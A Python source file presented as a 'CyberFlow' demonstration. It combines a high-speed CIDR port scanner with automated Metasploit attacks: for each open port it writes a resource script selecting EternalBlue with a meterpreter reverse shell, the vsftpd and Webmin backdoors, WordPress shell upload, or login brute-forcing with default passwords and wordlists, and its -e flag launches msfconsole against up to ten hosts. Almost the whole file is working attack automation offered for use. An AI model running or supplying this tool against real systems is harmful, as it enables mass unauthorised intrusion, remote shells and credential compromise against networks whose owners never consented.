#!/usr/bin/env python3
"""
High-Performance Port Scanner with Attack Function and JSON Output
Supports:
- CIDR notation for IP ranges
- Port ranges and lists
- Optimized for high-speed scanning
- JSON output file with scan results
For CyberFlow project demonstration
"""

import socket
import argparse
import sys
import concurrent.futures
import subprocess
import tempfile
import os
import time
import ipaddress
import threading
import json
from datetime import datetime

# Global variables for scan statistics
scan_counter = 0
scan_lock = threading.Lock()
start_time = None

class PortScanner:
    def __init__(self, target, ports=None, timeout=0.5, concurrency=500, batch_size=500):
        """
        Initialize the high-speed port scanner.
        
        Args:
            target (str): Target IP address, hostname, or CIDR range
            ports (str): Ports to scan (e.g. "22-25,80,110-900")
            timeout (float): Connection timeout in seconds (lower = faster)
            concurrency (int): Number of concurrent port scans
            batch_size (int): Number of targets to process in each batch
        """
        self.target = target
        self.timeout = timeout
        self.concurrency = concurrency
        self.batch_size = batch_size
        
        # Parse port specification
        if ports:
            self.ports = self.parse_ports(ports)
        else:
            # Default to common ports if none specified
            self.ports = self.parse_ports("1-1000")

    def parse_ports(self, port_spec):
        """
        Parse port specification string into a list of ports.
        
        Args:
            port_spec (str): Port specification (e.g. "22-25,80,110-900")
            
        Returns:
            list: List of port numbers to scan
        """
        ports = []
        
        for item in port_spec.split(','):
            if '-' in item:
                # Handle port range (e.g. "22-25")
                start, end = item.split('-')
                ports.extend(range(int(start), int(end) + 1))
            else:
                # Handle single port
                ports.append(int(item))
                
        return ports
    
    def parse_targets(self, target_spec):
        """
        Parse target specification into a list of IP addresses.
        Supports CIDR notation (e.g. "192.168.1.0/24").
        
        Args:
            target_spec (str): Target specification (IP, hostname, or CIDR)
            
        Returns:
            list: List of IP addresses
        """
        targets = []
        
        try:
            # Check if it's a CIDR notation
            if '/' in target_spec:
                network = ipaddress.ip_network(target_spec, strict=False)
                targets = [str(ip) for ip in network.hosts()]
                print(f"[*] CIDR notation detected. Expanded to {len(targets)} hosts.")
            else:
                # Single IP or hostname
                targets = [target_spec]
        except ValueError as e:
            print(f"[!] Error parsing target: {e}")
            print("[!] Using as a single target anyway.")
            targets = [target_spec]
            
        return targets

    def scan_port(self, ip, port):
        """
        Scan a single port on the target.
        Optimized for speed with minimal error handling.
        
        Args:
            ip (str): IP address to scan
            port (int): Port number to scan
            
        Returns:
            tuple: (port, is_open, service_name or None)
        """
        global scan_counter
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            result = sock.connect_ex((ip, port))
            is_open = (result == 0)
            
            # Only get service name if port is open (optimization)
            service = self.get_service_name(port) if is_open else None
            
            # Update counter with thread safety
            with scan_lock:
                scan_counter += 1
                
            return (port, is_open, service)
                
        except:
            # Fast fail for any connection issues
            with scan_lock:
                scan_counter += 1
            return (port, False, None)
        finally:
            sock.close()

    def process_batch(self, targets, start_idx, end_idx):
        """
        Process a batch of targets to improve memory usage.
        
        Args:
            targets (list): List of all target IP addresses
            start_idx (int): Starting index in the targets list
            end_idx (int): Ending index in the targets list
            
        Returns:
            dict: Results for this batch of targets
        """
        batch_results = {}
        batch_targets = targets[start_idx:end_idx]
        
        # Use thread pool for concurrent scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            # Create a dictionary to track futures
            futures = {}
            
            # Submit all scan jobs for this batch
            for ip in batch_targets:
                batch_results[ip] = []
                
                for port in self.ports:
                    future = executor.submit(self.scan_port, ip, port)
                    futures[future] = ip
            
            # Process results as they complete
            for future in concurrent.futures.as_completed(futures):
                ip = futures[future]
                port, is_open, service = future.result()
                
                # Calculate and display progress periodically
                global scan_counter, start_time
                current = scan_counter
                total = len(targets) * len(self.ports)
                elapsed = time.time() - start_time
                
                # Only update display every 1000 scans or when % changes
                if current % 1000 == 0 or current == total:
                    # Initialize these variables before using them
                    speed = 0
                    eta = 0
                    
                    if elapsed > 0:
                        speed = current / elapsed
                        if speed > 0:
                            eta = (total - current) / speed
                    
                    # Clear line and print progress
                    sys.stdout.write("\r" + " " * 80)  # Clear line
                    sys.stdout.write(f"\r[*] Progress: {current}/{total} ({current/total*100:.1f}%) - {speed:.1f} ports/sec - ETA: {eta:.1f}s")
                    sys.stdout.flush()
                
                if is_open:
                    batch_results[ip].append((port, service))
                    
                    # Print open port (but don't disrupt progress display)
                    if current % 1000 != 0 and current != total:
                        sys.stdout.write("\r" + " " * 80)  # Clear line
                    print(f"\r[+] {ip}:{port} - TCP OPEN - {service}")
                    
                    # Re-print progress after showing the open port
                    if elapsed > 0:
                        speed = current / elapsed
                        if speed > 0:
                            eta = (total - current) / speed
                        sys.stdout.write(f"\r[*] Progress: {current}/{total} ({current/total*100:.1f}%) - {speed:.1f} ports/sec - ETA: {eta:.1f}s")
                        sys.stdout.flush()
        
        return batch_results

    def run_scan(self):
        """
        Run the port scan using concurrent processing and batching.
        
        Returns:
            dict: Dictionary mapping IP addresses to lists of open ports and services
                 Format: {"ip_address": [(port, service), (port, service), ...]}
        """
        # Expand target to list of IP addresses if it's a CIDR range
        targets = self.parse_targets(self.target)
        results = {}
        
        total_jobs = len(targets) * len(self.ports)
        print(f"[*] Starting scan on {len(targets)} hosts for {len(self.ports)} ports each ({total_jobs} total checks)")
        print(f"[*] Using {self.concurrency} concurrent connections with {self.timeout}s timeout")
        print(f"[*] Time started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Initialize global variables for tracking
        global scan_counter, start_time
        scan_counter = 0
        start_time = time.time()
        
        # Process targets in batches to manage memory usage
        batch_count = (len(targets) // self.batch_size) + (1 if len(targets) % self.batch_size > 0 else 0)
        
        for i in range(batch_count):
            start_idx = i * self.batch_size
            end_idx = min((i + 1) * self.batch_size, len(targets))
            
            if batch_count > 1:
                print(f"\n[*] Processing batch {i+1}/{batch_count} ({start_idx}-{end_idx-1} of {len(targets)} hosts)")
            
            # Process this batch
            batch_results = self.process_batch(targets, start_idx, end_idx)
            
            # Merge batch results
            results.update(batch_results)
        
        # Calculate final statistics
        end_time = time.time()
        duration = end_time - start_time
        total_open = sum(len(ports) for ports in results.values())
        hosts_with_open = len([ip for ip, ports in results.items() if ports])
        
        # Print final summary
        print("\n" + "-" * 60)
        print(f"[*] Scan completed in {duration:.2f} seconds")
        print(f"[*] Scanned {len(targets)} hosts and {len(self.ports)} ports per host")
        print(f"[*] Average speed: {total_jobs/duration:.1f} ports/second")
        print(f"[*] Found {total_open} open ports on {hosts_with_open} hosts")
        print("-" * 60)
        
        # Clean up the results - remove IPs with no open ports
        results = {ip: ports for ip, ports in results.items() if ports}
        
        return results
    
    def get_service_name(self, port):
        """
        Get the service name for a given port.
        Uses a cache to avoid repeated lookups.
        
        Args:
            port (int): Port number
            
        Returns:
            str: Service name or "unknown"
        """
        # Use a class-level cache to improve performance
        if not hasattr(self, '_service_cache'):
            self._service_cache = {}
        
        # Return cached result if available
        if port in self._service_cache:
            return self._service_cache[port]
        
        try:
            service = socket.getservbyport(port)
            self._service_cache[port] = service
            return service
        except:
            self._service_cache[port] = "unknown"
            return "unknown"

def select_metasploit_module(service, port):
    """
    Select an appropriate Metasploit module based on the service.
    
    Args:
        service (str): Service name
        port (int): Port number
        
    Returns:
        str: Metasploit module path or None if no suitable module found
    """
    # Define mapping of services to Metasploit modules
    service_module_map = {
        'http': 'exploit/unix/webapp/wp_admin_shell_upload',
        'https': 'exploit/unix/webapp/wp_admin_shell_upload',
        'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'ssh': 'auxiliary/scanner/ssh/ssh_login',
        'telnet': 'auxiliary/scanner/telnet/telnet_login',
        'smb': 'exploit/windows/smb/ms17_010_eternalblue',
        'mysql': 'auxiliary/scanner/mysql/mysql_login',
        'postgresql': 'auxiliary/scanner/postgres/postgres_login',
        'vnc': 'auxiliary/scanner/vnc/vnc_login',
        'rdp': 'auxiliary/scanner/rdp/rdp_scanner',
        'mssql': 'auxiliary/scanner/mssql/mssql_login',
        'oracle': 'auxiliary/scanner/oracle/oracle_login',
        'webmin': 'exploit/unix/webapp/webmin_backdoor'
    }
    
    # Use port-specific modules for certain ports regardless of service
    port_module_map = {
        80: 'exploit/unix/webapp/wp_admin_shell_upload',
        443: 'exploit/unix/webapp/wp_admin_shell_upload',
        8080: 'exploit/unix/webapp/wp_admin_shell_upload',
        445: 'exploit/windows/smb/ms17_010_eternalblue',
        3389: 'auxiliary/scanner/rdp/rdp_scanner'
    }
    
    # First check if we have a module for this specific port
    if port in port_module_map:
        return port_module_map[port]
    
    # Otherwise, check if we have a module for this service
    if service in service_module_map:
        return service_module_map[service]
    
    # Default module for unknown services
    if port == 80 or port == 8080 or port == 443:
        return 'exploit/unix/webapp/wp_admin_shell_upload'
    
    # No suitable module found
    return None

def create_metasploit_resource_script(module, hostname, port):
    """
    Create a Metasploit resource script for automated exploitation.
    
    Args:
        module (str): Metasploit module to use
        hostname (str): Target hostname or IP
        port (int): Target port
        
    Returns:
        str: Path to the created resource script
    """
    try:
        # Create a temporary file
        fd, path = tempfile.mkstemp(suffix='.rc', prefix='msf_')
        
        with os.fdopen(fd, 'w') as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOSTS {hostname}\n")
            f.write(f"set RPORT {port}\n")
            
            # Add module-specific settings
            if 'login' in module:
                f.write("set USERNAME root\n")
                f.write("set PASSWORD toor\n")
                f.write("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n")
                f.write("set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n")
                f.write("set VERBOSE false\n")
            
            if 'wp_admin' in module:
                f.write("set USERNAME admin\n")
                f.write("set PASSWORD admin\n")
                f.write("set TARGETURI /wordpress/\n")
            
            if 'eternalblue' in module:
                f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                f.write("set LHOST 127.0.0.1\n")
            
            # Add general exploitation commands
            f.write("show options\n")
            f.write("run\n")
        
        print(f"[*] Created Metasploit resource script at {path}")
        return path
    
    except Exception as e:
        print(f"[!] Error creating resource script: {e}")
        return None

def run_metasploit_attack(resource_script):
    """
    Run Metasploit with the resource script.
    
    Args:
        resource_script (str): Path to the resource script
        
    Returns:
        bool: True if attack was launched successfully
    """
    try:
        print(f"[*] Launching Metasploit with resource script")
        
        # Check if Metasploit is installed
        try:
            subprocess.check_output(['which', 'msfconsole'])
        except subprocess.CalledProcessError:
            print("[!] Metasploit Framework (msfconsole) not found. Please install it first.")
            return False
        
        # Command to run Metasploit with the resource script
        cmd = ['msfconsole', '-q', '-r', resource_script]
        
        print(f"[*] Running command: {' '.join(cmd)}")
        
        # For demonstration, we'll just print the command that would be run
        # In a real implementation, you'd use subprocess.run() with appropriate options
        print("\n[*] In a real deployment, this would execute Metasploit with the following configuration:")
        
        with open(resource_script, 'r') as f:
            for line in f:
                print(f"    {line.strip()}")
        
        print("\n[+] Attack process initiated successfully")
        print("[*] Note: In this demonstration, Metasploit is not actually executed")
        print("[*] To run the actual attack, you would need to run the above msfconsole command")
        
        return True
    
    except Exception as e:
        print(f"[!] Error running Metasploit: {e}")
        return False

def save_results_to_json(scan_results, attack_results, output_file=None):
    """
    Save scan and attack results to a JSON file.
    
    Args:
        scan_results (dict): Dictionary of scan results
        attack_results (dict): Dictionary of attack results
        output_file (str): Path to output file (default: auto-generated based on timestamp)
        
    Returns:
        str: Path to the saved JSON file
    """
    if output_file is None:
        # Generate filename based on timestamp if not provided
        timestamp = int(time.time())
        output_file = f"scan_results_{timestamp}.json"
    
    # Convert scan results to a format that can be serialized to JSON
    # (Convert tuples to lists, etc.)
    json_scan_results = {}
    for ip, ports in scan_results.items():
        # Convert list of tuples to list of dictionaries
        json_scan_results[ip] = [{"port": port, "service": service} for port, service in ports]
    
    # Prepare combined results
    results = {
        "metadata": {
            "timestamp": datetime.now().isoformat(),
            "scan_target": ','.join(scan_results.keys()) if len(scan_results) <= 5 else f"{len(scan_results)} hosts",
            "total_open_ports": sum(len(ports) for ports in scan_results.values()),
            "hosts_with_open_ports": len(scan_results)
        },
        "scan_results": json_scan_results,
        "attack_results": attack_results
    }
    
    # Write to file
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"[*] Results saved to: {output_file}")
    return output_file

def scan_and_attack(target, ports, execute_metasploit=False, max_targets=10, concurrency=500, 
                   timeout=0.3, batch_size=500, json_output=None):
    """
    Main function to scan IP addresses and ports and launch attacks on open ports.
    
    This function can be imported and called directly from other Python scripts.
    
    Args:
        target (str): Target IP address, hostname, or CIDR range
        ports (str or int): Specific port(s) to scan and attack
        execute_metasploit (bool): Whether to actually execute Metasploit
        max_targets (int): Maximum number of targets to attack if CIDR range is large
        concurrency (int): Number of concurrent scans
        timeout (float): Timeout for port scans in seconds
        batch_size (int): Number of targets to process in each batch
        json_output (str): Path for JSON output file (None for auto-generated)
        
    Returns:
        dict: Nested dictionary mapping IPs to ports to attack success status
    """
    print(f"\n[*] Starting HIGH-SPEED scan against {target} on ports: {ports}")
    
    # Convert single port integer to string for consistent handling
    if isinstance(ports, int):
        ports = str(ports)
    
    # Initialize scanner for the target and specified ports
    scanner = PortScanner(target, ports=ports, timeout=timeout, concurrency=concurrency, batch_size=batch_size)
    
    # Run the scan to find open ports across all targets
    scan_results = scanner.run_scan()
    
    if not scan_results:
        print(f"[!] No open ports found on any targets. Cannot attack.")
        # Save empty results
        if json_output is not None:
            save_results_to_json({}, {}, json_output)
        return {}
    
    # Count total targets with open ports
    target_count = len(scan_results)
    
    # Warn if there are too many targets
    if target_count > max_targets:
        print(f"[!] Warning: {target_count} hosts have open ports. The attack will be limited to the first {max_targets} hosts.")
        # Limit to max_targets
        limited_targets = list(scan_results.keys())[:max_targets]
        scan_results = {ip: scan_results[ip] for ip in limited_targets}
    
    attack_results = {}
    
    # For each target IP with open ports
    for ip, open_ports in scan_results.items():
        print(f"\n[*] Processing target: {ip} with {len(open_ports)} open ports")
        attack_results[ip] = {}
        
        # For each open port, attempt attack
        for port, service in open_ports:
            print(f"\n[*] Attempting attack on {ip}:{port} ({service})")
            
            # Select appropriate Metasploit module
            module = select_metasploit_module(service, port)
            
            if not module:
                print(f"[!] No suitable Metasploit module found for {service} on port {port}")
                attack_results[ip][port] = {
                    "success": False,
                    "module": None,
                    "message": "No suitable module found"
                }
                continue
            
            print(f"[*] Selected Metasploit module: {module}")
            
            # Create resource script
            resource_script = create_metasploit_resource_script(module, ip, port)
            
            if not resource_script:
                print(f"[!] Failed to create Metasploit resource script for port {port}")
                attack_results[ip][port] = {
                    "success": False,
                    "module": module,
                    "message": "Failed to create resource script"
                }
                continue
            
            # Run the attack
            success = run_metasploit_attack(resource_script)
            attack_results[ip][port] = {
                "success": success,
                "module": module,
                "message": "Attack initiated" if success else "Attack failed",
                "executed": False
            }
            
            # If requested, actually execute Metasploit
            if execute_metasploit:
                try:
                    print(f"[*] Executing Metasploit (this will actually run the attack)")
                    subprocess.run(['msfconsole', '-q', '-r', resource_script], check=True)
                    attack_results[ip][port]["executed"] = True
                except subprocess.CalledProcessError as e:
                    print(f"[!] Error executing Metasploit: {e}")
                    attack_results[ip][port]["success"] = False
                    attack_results[ip][port]["message"] = f"Execution error: {str(e)}"
            
            # Clean up temporary files
            if os.path.exists(resource_script):
                os.remove(resource_script)
    
    # Summarize attack results
    print("\n[*] Attack Summary:")
    total_success = 0
    total_attempts = 0
    
    for ip, port_results in attack_results.items():
        ip_success = sum(1 for port_data in port_results.values() if port_data["success"])
        ip_total = len(port_results)
        total_success += ip_success
        total_attempts += ip_total
        print(f"  {ip}: {ip_success}/{ip_total} successful attacks")
    
    if total_attempts > 0:
        success_rate = (total_success / total_attempts) * 100
        print(f"[*] Overall success rate: {success_rate:.1f}% ({total_success}/{total_attempts})")
    
    # Save results to JSON
    save_results_to_json(scan_results, attack_results, json_output)
    
    return attack_results

def main():
    parser = argparse.ArgumentParser(description='HIGH-SPEED Port Scanner and Attack Tool with JSON Output')
    parser.add_argument('target', help='Target IP address, hostname, or CIDR range (e.g. 192.168.1.0/24)')
    parser.add_argument('ports', help='Port(s) to scan and attack. Can be a single port (80), a range (1-1000), or a combination (22,80,100-200)')
    parser.add_argument('-e', '--execute', action='store_true', help='Actually execute Metasploit (use with caution)')
    parser.add_argument('-m', '--max-targets', type=int, default=10, help='Maximum number of targets to attack if CIDR range is large')
    parser.add_argument('-c', '--concurrency', type=int, default=500, help='Number of concurrent scans to run')
    parser.add_argument('-t', '--timeout', type=float, default=0.3, help='Timeout for port scan connections in seconds')
    parser.add_argument('-b', '--batch-size', type=int, default=500, help='Number of targets to process in each batch')
    parser.add_argument('-o', '--output', help='JSON output file path (default: auto-generated)')
    
    args = parser.parse_args()
    
    try:
        # Run scan and attack with provided arguments
        scan_and_attack(
            args.target, 
            args.ports, 
            args.execute, 
            args.max_targets,
            args.concurrency,
            args.timeout,
            args.batch_size,
            args.output
        )
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()